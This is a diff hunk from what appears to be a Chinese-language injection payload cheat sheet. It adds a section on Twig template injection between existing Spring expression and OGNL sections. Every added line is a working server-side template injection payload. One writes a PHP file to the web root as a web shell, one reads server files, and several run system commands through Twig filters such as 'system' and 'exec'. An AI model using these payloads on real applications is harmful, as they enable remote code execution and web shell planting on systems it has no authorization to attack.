@@ -148,6 +148,16 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 ```
 
 
+## twig 模板注入
+```
+{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
+{{'/etc/xxx'|file_excerpt(1,30)}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+
+```
+
 
 # Ognl 表达式注入
 ```
